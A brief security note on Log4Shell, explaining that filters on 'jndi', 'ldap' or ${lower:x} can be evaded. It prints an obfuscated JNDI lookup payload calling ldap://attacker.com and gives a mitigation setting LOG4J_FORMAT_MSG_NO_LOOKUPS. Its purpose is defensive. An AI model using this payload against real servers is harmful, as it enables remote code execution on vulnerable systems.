# Log4Shell notes

If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you:

`${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}`

This gets past every filter I've found so far. There's no shortage of these bypasses.

Block the log4j zero day...

`echo "export LOG4J_FORMAT_MSG_NO_LOOKUPS=true" >> /etc/profile.d/blockzero.sh`
